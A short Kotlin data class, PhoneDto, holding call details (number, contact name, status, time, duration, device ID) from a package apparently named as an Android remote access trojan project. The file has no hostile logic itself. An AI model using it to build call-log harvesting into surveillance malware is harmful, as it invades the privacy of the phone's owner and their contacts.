package com.nqmgaming.androidrat.data

import android.os.Build
import kotlin.time.Duration

data class PhoneDto(
    val number: String? = null,
    val name: String? = null,
    val status: String? = null,
    val time: String? = null,
    val duration: String? = null,
    val deviceId: String = Build.ID
)